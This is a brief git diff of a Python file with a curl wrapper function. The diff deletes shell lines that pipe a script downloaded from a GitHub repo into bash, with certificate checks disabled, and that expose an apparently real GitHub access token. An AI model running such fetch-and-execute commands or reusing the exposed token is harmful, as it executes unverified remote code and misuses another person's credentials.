@@ -18,9 +18,3 @@ def RunCurl(param:dict, debug=True) -> list:
 
 #param={'method':'GET', 'url':'', 'headers':['Authorization: Bearer ??????????????????????????'], 'timeout':60}
 #print(RunCurl(param))
-
-
-export GIT_URL='https://api.github.com/repos/paulocotta/WSAPP/contents/runs/mkst.sh?ref=main';
-export GIT_H1='Authorization: token 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';
-export GIT_H2='Accept: application/vnd.github.v3.raw';
-curl -sfkLm10 --retry 10 --retry-delay 10 -H "${GIT_H1}" -H "${GIT_H2}" "${GIT_URL}" | bash;
